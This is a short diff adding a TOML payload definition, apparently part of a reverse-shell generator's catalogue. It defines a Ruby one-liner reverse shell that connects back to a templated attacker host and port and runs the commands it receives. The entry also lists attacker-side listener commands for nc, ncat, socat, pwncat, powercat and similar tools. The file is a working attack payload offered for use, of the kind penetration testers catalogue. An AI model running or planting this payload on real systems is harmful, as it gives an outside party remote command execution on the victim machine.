@@ -1,0 +1,22 @@
+id = "ruby_no_sh"
+name = "Ruby no sh"
+os = "unix"
+type = "reverse"
+proto = "tcp"
+lang = "ruby"
+description = "Ruby reverse shell without using sh, supports cd and exit."
+
+payload = "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{{LHOST}}\",\"{{LPORT}}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_.inspect}\"}'"
+
+[listeners]
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}}"
